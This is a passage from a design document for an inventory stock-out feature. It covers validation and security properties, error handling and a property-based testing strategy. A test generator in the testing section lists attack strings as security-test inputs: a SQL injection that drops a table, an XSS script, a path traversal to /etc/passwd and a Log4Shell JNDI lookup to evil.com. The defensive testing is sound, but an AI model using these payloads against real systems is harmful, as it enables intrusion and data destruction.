**Validates: Requirements 10.1**

### Property 45: Security Event Logging

*For any* authentication attempt, authorization check, or security-related event (successful or failed), the system SHALL create a log entry containing the user identity, timestamp, IP address, action attempted, and result.

**Validates: Requirements 10.3**

### Property 46: Input Validation for Injection Prevention

*For any* user input field (transaction notes, item notes, reason descriptions), the system SHALL validate and sanitize input to prevent SQL injection, XSS, and other injection attacks, rejecting any input containing malicious patterns.

**Validates: Requirements 10.6**

### Property 47: Rate Limiting Enforcement

*For any* user or API client, if the number of requests within a time window exceeds the configured rate limit, the system SHALL reject subsequent requests with a rate limit error until the time window resets.

**Validates: Requirements 10.7**

#### Parsing and Import Properties

### Property 48: CSV Format Validation

*For any* uploaded CSV file, the system SHALL validate that the file structure matches the expected format (correct number of columns, valid headers, proper encoding) before attempting to parse the content, rejecting invalid files with specific format errors.

**Validates: Requirements 11.2**

### Property 49: Parsing Error Detail

*For any* CSV parsing error, the error message SHALL include the specific line number, column name, expected format, and actual value that caused the error, enabling users to locate and correct the issue.

**Validates: Requirements 11.3**

### Property 50: Template-Based Parsing

*For any* CSV file uploaded with a specified template identifier, the system SHALL parse the file according to the column mappings, data types, and validation rules defined in that template configuration.

**Validates: Requirements 11.4**

### Property 51: Round-Trip Parse-Format Equivalence

*For any* valid stock-out transaction data, parsing the data from CSV format, then formatting it back to CSV, then parsing again SHALL produce data equivalent to the original parsed data (preserving all field values and structure).

**Validates: Requirements 11.5**

### Property 52: Valid CSV Export Format

*For any* stock-out transaction data formatted for CSV export, the output SHALL be a valid CSV file that can be parsed by standard CSV parsers, with proper quoting of special characters, correct delimiter usage, and valid encoding.

**Validates: Requirements 11.6**

### Property 53: Special Character Handling

*For any* stock-out data containing special characters (quotes, commas, newlines, Unicode characters), the CSV parser and formatter SHALL correctly handle these characters using proper escaping and encoding, preserving the exact character values through parse and format operations.

**Validates: Requirements 11.7**

### Property 54: Duplicate Record Detection

*For any* CSV import containing duplicate records (same inventory item, quantity, and reason code within the same file), the system SHALL detect and flag the duplicates, providing the user with options to skip, merge, or process them separately.

**Validates: Requirements 11.8**

#### Performance Properties

### Property 55: Cache Utilization

*For any* frequently accessed reference data (reason codes, inventory item details, user permissions), if the data is requested multiple times within the cache TTL period, the system SHALL serve the data from cache rather than querying the database, reducing database load.

**Validates: Requirements 12.7**

---

## Error Handling

### Error Categories

#### 1. Validation Errors
**Cause**: Invalid input data, business rule violations
**Handling**:
- Return HTTP 400 Bad Request
- Provide detailed validation error messages
- Include field-level error information
- Do not modify system state
- Log validation failures for analytics

**Example**:
```typescript
{
  success: false,
  error: {
    code: 'VALIDATION_ERROR',
    message: 'Transaction validation failed',
    details: {
      items: [
        {
          index: 0,
          field: 'quantity',
          message: 'Quantity must be a positive number',
          value: -5
        }
      ]
    }
  }
}
```

#### 2. Authorization Errors
**Cause**: Insufficient permissions, invalid credentials
**Handling**:
- Return HTTP 401 Unauthorized or 403 Forbidden
- Log security events
- Do not reveal system internals
- Provide generic error messages to prevent information leakage

**Example**:
```typescript
{
  success: false,
  error: {
    code: 'AUTHORIZATION_ERROR',
    message: 'You do not have permission to perform this operation'
  }
}
```

#### 3. Business Logic Errors
**Cause**: Workflow violations, state conflicts
**Handling**:
- Return HTTP 409 Conflict or 422 Unprocessable Entity
- Provide clear explanation of the conflict
- Suggest resolution steps
- Maintain system consistency

**Example**:
```typescript
{
  success: false,
  error: {
    code: 'WORKFLOW_VIOLATION',
    message: 'Cannot modify transaction in approved status',
    details: {
      currentStatus: 'approved',
      allowedStatuses: ['draft', 'pending_approval']
    }
  }
}
```

#### 4. Database Errors
**Cause**: Connection failures, constraint violations, deadlocks
**Handling**:
- Retry transient errors with exponential backoff
- Rollback transactions on failure
- Queue operations for offline processing if connectivity lost
- Log detailed error information
- Return generic error to user

**Example**:
```typescript
{
  success: false,
  error: {
    code: 'DATABASE_ERROR',
    message: 'Unable to process request. Please try again.'
  }
}
```

#### 5. Integration Errors
**Cause**: External system failures, network issues
**Handling**:
- Queue events for retry
- Continue processing if non-critical
- Log integration failures
- Notify administrators for persistent failures

**Example**:
```typescript
{
  success: false,
  error: {
    code: 'INTEGRATION_ERROR',
    message: 'Transaction saved but notification failed. Will retry automatically.'
  }
}
```

### Error Recovery Strategies

#### Retry with Exponential Backoff
```typescript
async function retryWithBackoff<T>(
  operation: () => Promise<T>,
  maxRetries: number = 3,
  baseDelay: number = 1000
): Promise<T> {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      return await operation()
    } catch (error) {
      if (attempt === maxRetries - 1) throw error
      
      const delay = baseDelay * Math.pow(2, attempt)
      await new Promise(resolve => setTimeout(resolve, delay))
    }
  }
  throw new Error('Max retries exceeded')
}
```

#### Transaction Rollback
```typescript
async function executeWithRollback<T>(
  operation: () => Promise<T>
): Promise<T> {
  const queryRunner = dataSource.createQueryRunner()
  await queryRunner.connect()
  await queryRunner.startTransaction()
  
  try {
    const result = await operation()
    await queryRunner.commitTransaction()
    return result
  } catch (error) {
    await queryRunner.rollbackTransaction()
    await auditService.logFailure(error)
    throw error
  } finally {
    await queryRunner.release()
  }
}
```

#### Offline Queue Processing
```typescript
async function processWithOfflineSupport<T>(
  operation: () => Promise<T>,
  queueData: any
): Promise<T> {
  if (!connectivityService.isOnline()) {
    await syncQueueService.enqueue(queueData)
    return { queued: true } as T
  }
  
  try {
    return await operation()
  } catch (error) {
    if (isNetworkError(error)) {
      await syncQueueService.enqueue(queueData)
      return { queued: true } as T
    }
    throw error
  }
}
```

### Error Logging

All errors must be logged with:
- Error type and message
- Stack trace
- User context (ID, session)
- Request context (endpoint, parameters)
- Timestamp
- Correlation ID
- System state information

```typescript
interface ErrorLog {
  id: string
  timestamp: Date
  level: 'error' | 'warning' | 'critical'
  errorType: string
  message: string
  stackTrace: string
  userId: string
  sessionId: string
  correlationId: string
  endpoint: string
  requestParams: any
  systemState: any
}
```

---

## Testing Strategy

### Testing Approach

The Stock-Out Transaction feature requires a comprehensive testing strategy combining multiple testing methodologies to ensure correctness, reliability, and performance.

#### 1. Property-Based Testing (Primary)

**Library**: fast-check (TypeScript/JavaScript)

**Configuration**:
- Minimum 100 iterations per property test
- Seed-based reproducibility for failed tests
- Shrinking enabled for minimal failing examples

**Test Organization**:
```typescript
// tests/properties/transaction-creation.property.test.ts
describe('Stock-Out Transaction Creation Properties', () => {
  it('Property 1: Unique Transaction Identifier', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.array(stockOutTransactionArbitrary(), { minLength: 1, maxLength: 100 }),
        async (transactions) => {
          const ids = new Set<string>()
          
          for (const txn of transactions) {
            const created = await stockOutService.createTransaction(txn)
            expect(ids.has(created.id)).toBe(false)
            ids.add(created.id)
          }
        }
      ),
      { numRuns: 100 }
    )
  })
})
```

**Property Test Tags**:
Each property test must include a comment tag referencing the design property:
```typescript
/**
 * Feature: trn-stock-out, Property 1: Unique Transaction Identifier
 * For any valid stock-out transaction creation request, the system SHALL 
 * generate and return a transaction with a unique identifier that never 
 * collides with existing transaction identifiers.
 */
```

**Generators (Arbitraries)**:
```typescript
// tests/arbitraries/stock-out.arbitraries.ts

// Generate valid stock-out transactions
function stockOutTransactionArbitrary(): fc.Arbitrary<CreateStockOutDto> {
  return fc.record({
    items: fc.array(stockOutItemArbitrary(), { minLength: 1, maxLength: 50 }),
    notes: fc.option(fc.string({ maxLength: 500 }), { nil: undefined })
  })
}

// Generate stock-out items
function stockOutItemArbitrary(): fc.Arbitrary<StockOutItemDto> {
  return fc.record({
    inventoryItemId: fc.uuid(),
    quantity: fc.integer({ min: 1, max: 10000 }),
    reasonCodeId: fc.uuid(),
    notes: fc.option(fc.string({ maxLength: 200 }), { nil: undefined })
  })
}

// Generate invalid quantities for error testing
function invalidQuantityArbitrary(): fc.Arbitrary<any> {
  return fc.oneof(
    fc.constant(0),
    fc.integer({ max: -1 }),
    fc.constant(null),
    fc.constant(undefined),
    fc.string(),
    fc.constant(NaN)
  )
}

// Generate malicious input for security testing
function maliciousInputArbitrary(): fc.Arbitrary<string> {
  return fc.oneof(
    fc.constant("'; DROP TABLE stock_out_transactions; --"),
    fc.constant("<script>alert('xss')</script>"),
    fc.constant("../../../etc/passwd"),
    fc.constant("${jndi:ldap://evil.com/a}")
  )
}
```

#### 2. Unit Testing (Complementary)

**Purpose**: Test specific examples, edge cases, and component isolation

**Examples**:
```typescript
// tests/unit/validation.service.test.ts
describe('ValidationService', () => {
  describe('validateQuantity', () => {
    it('should accept quantity of 1', async () => {
      const result = await validationService.validateQuantity('item-1', 1)
      expect(result.isValid).toBe(true)
    })
    
    it('should reject quantity of 0', async () => {
      const result = await validationService.validateQuantity('item-1', 0)
      expect(result.isValid).toBe(false)
      expect(result.errors).toContain('Quantity must be positive')
    })
    
    it('should reject negative quantity', async () => {
      const result = await validationService.validateQuantity('item-1', -5)
      expect(result.isValid).toBe(false)
    })
  })
})
```

#### 3. Integration Testing

**Purpose**: Test component interactions, database operations, and external integrations

**Examples**:
```typescript
// tests/integration/stock-out-workflow.test.ts
describe('Stock-Out Workflow Integration', () => {
  beforeEach(async () => {
    await setupTestDatabase()
  })
  
  afterEach(async () => {
    await cleanupTestDatabase()
  })
  
  it('should complete full approval workflow', async () => {
    // Create transaction
    const transaction = await stockOutService.createTransaction({
      items: [{ inventoryItemId: 'item-1', quantity: 100, reasonCodeId: 'damaged' }]
    })
    
    // Submit for approval
    await stockOutService.submitForApproval(transaction.id)
    
    // Verify approval workflow created
    const workflows = await approvalService.getApprovalStatus(transaction.id)
    expect(workflows).toHaveLength(1)
    
    // Approve
    await approvalService.approve(transaction.id, 'approver-1')
    
    // Verify inventory adjusted
    const item = await inventoryService.getItem('item-1')
    expect(item.availableQuantity).toBe(originalQuantity - 100)
  })
})
```

#### 4. End-to-End Testing

**Purpose**: Test complete user workflows through the UI

**Tool**: Playwright

**Examples**:
```typescript
// tests/e2e/stock-out-creation.e2e.ts
test('user can create and submit stock-out transaction', async ({ page }) => {
  await page.goto('/stock-out/create')
  
  // Add item
  await page.click('[data-testid="add-item-button"]')
  await page.fill('[data-testid="item-search"]', 'Widget A')
  await page.click('[data-testid="item-Widget-A"]')
  
  // Enter quantity
  await page.fill('[data-testid="quantity-input"]', '50')
  
  // Select reason
  await page.selectOption('[data-testid="reason-select"]', 'damaged')
  
  // Submit
  await page.click('[data-testid="submit-button"]')
  
  // Verify success
  await expect(page.locator('[data-testid="success-message"]')).toBeVisible()
})
```

### Test Coverage Requirements

- **Overall Coverage**: Minimum 80%
- **Critical Paths**: 100% coverage required
  - Transaction creation and validation
  - Inventory adjustment logic
  - Approval workflow
  - Audit trail recording
  - Offline sync queue

### Test Data Management

**Test Database**:
- Separate SQLite database for tests
- Reset between test suites
- Seed with known test data

**Test Fixtures**:
```typescript
// tests/fixtures/stock-out.fixtures.ts
export const testInventoryItems = [
  { id: 'item-1', sku: 'WID-001', name: 'Widget A', availableQuantity: 1000, unitCost: 10.50 },
  { id: 'item-2', sku: 'WID-002', name: 'Widget B', availableQuantity: 500, unitCost: 25.00 }
]

export const testReasonCodes = [
  { id: 'damaged', code: 'DAMAGED', description: 'Damaged goods', requiresApproval: false },
  { id: 'stolen', code: 'STOLEN', description: 'Stolen items', requiresApproval: true }
]
```

### Continuous Integration

**Test Execution**:
- Run all unit and property tests on every commit
- Run integration tests on pull requests
- Run E2E tests nightly and before releases

**Performance Benchmarks**:
- Track test execution time
- Alert on significant slowdowns
- Maintain test suite under 5 minutes for fast feedback

### Test Documentation

Each test file must include:
- Purpose and scope
- Setup and teardown requirements
- Dependencies and mocks
- Expected outcomes
- Links to requirements and design properties
